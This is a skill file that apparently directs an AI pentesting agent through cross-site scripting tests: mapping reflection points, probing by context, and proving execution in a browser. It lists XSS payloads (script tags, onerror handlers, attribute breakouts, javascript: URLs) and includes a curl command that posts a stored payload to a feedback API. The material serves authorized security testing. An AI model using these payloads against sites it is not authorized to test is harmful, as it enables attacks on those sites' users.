---
name: xss
description: Cross-site scripting testing — reflected, stored, and DOM-based
---

# Cross-Site Scripting (CWE-79)

## 1. Map reflection points

For each param, note WHERE user input reappears (body, attribute, JS string,
HTML comment):

```bash
curl -s "<target>/search?q=zxqj1234" | grep -n zxqj1234
```

The context decides the payload. Probe with a unique marker first — never
blind-fire payloads.

## 2. Probe by context

| Context | Probe |
| --- | --- |
| HTML body | `<b>zxqj1</b>` (does HTML survive?) then `<script>alert(1)</script>` |
| Tag attribute | `"><script>alert(1)</script>` or break out with `" autofocus onfocus=alert(1) x="` |
| JS string | `';alert(1);//` or `"-alert(1)-"` |
| URL param rendered as href | `javascript:alert(1)` |

If angle brackets/quotes get encoded, test what the filter actually blocks
(`<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`) — one variant per
request, watch what survives in the response.

## 3. Confirm executable context

A finding requires the payload landing in the page UNESCAPED in a spot the
browser executes. Two levels of proof:

1. Reflection (curl is fine):
   - the request with the payload,
   - the response line where the payload appears raw (`grep -n` output).
2. Execution (browser — this is what makes it a solid finding):
   - payload with an observable effect (`<img src=x onerror=window.__xss=1>`
     or `alert(document.domain)`),
   - `browser_navigate` to the reflecting URL, then `browser_read_page`
     (recorded `dialogs` entry) or `browser_evaluate` `window.__xss` → 1,
   - `browser_screenshot` as visual evidence, and `view_request` on the
     captured exchange from the proxy.

For DOM-based XSS (sink in JS, e.g. `innerHTML = location.hash`), curl shows
nothing — show the source line proving the sink (fetch the JS), give the
victim URL, and prove execution with the browser exactly as above. Read the
`browser_testing` skill for the full workflow.

## 4. Stored XSS

Find inputs that persist and render later (profile fields, feedback/comments):

1. Post payload — via the app's own form (`browser_fill` + `browser_click`)
   or the API behind it (find it in `view_sitemap`):
   `curl -s -X POST <target>/api/Feedback -H 'Content-Type: application/json' -d '{"comment":"<img src=x onerror=alert(1)>","rating":5}'`
   (add `-b /home/pentester/cookies.txt` on authenticated scans).
2. Render it back with `browser_navigate` on the page that displays it —
   an SPA usually needs the browser to actually execute the render.
3. Prove execution (`browser_read_page` dialogs / `browser_evaluate`
   marker) and `browser_screenshot` the result. Reference the proxy-captured
   request id (`view_request`) in the evidence.

## Severity guide

Reflected in search (needs click) → usually medium/high. Stored → high.
DOM-based → medium/high. Only report `<b>`-style HTML injection as low or
merge it into a broader input-sanitization finding.
